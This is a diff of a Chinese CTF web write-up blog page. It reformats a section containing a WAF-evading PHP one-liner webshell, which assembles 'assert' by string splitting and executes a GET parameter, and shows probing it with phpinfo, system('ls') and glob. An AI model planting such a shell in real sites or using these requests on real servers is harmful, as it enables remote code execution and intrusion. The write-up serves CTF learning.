@@ -110,7 +110,7 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/shangchuan01.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/yijuhua1.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/yijuhua2.PNG">
-<meta property="og:updated_time" content="2017-10-05T14:29:52.792Z">
+<meta property="og:updated_time" content="2017-10-07T15:43:25.220Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="杂七杂八的web">
 <meta name="twitter:description" content="burp 爆破">
@@ -403,7 +403,7 @@
 <p>forward就可以啦</p>
 <h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>很关键的一个技巧 但是容易忘</p>
 <p>页面没啥下一步的提示时 试试robots.txt总没错</p>
-<h3 id="一句话利用"><a href="#一句话利用" class="headerlink" title="一句话利用"></a>一句话利用</h3><p>题目说 送给大家一个过狗一句话<br>&lt;?php $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’]) ?&gt;</p>
+<h3 id="一句话利用"><a href="#一句话利用" class="headerlink" title="一句话利用"></a>一句话利用</h3><p>题目说 送给大家一个过狗一句话<br><code>&lt;?php $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;]) ?&gt;</code></p>
 <p><a href="http://120.24.86.145:8010/?s=phpinfo(" target="_blank" rel="external">http://120.24.86.145:8010/?s=phpinfo(</a>) 发现已经上传好了 可以直接利用</p>
 <p>先尝试读取文件目录 ?s=system(‘ls’) 发现不行</p>
 <p>改为 ?s=print_r(glob(“*”))</p>
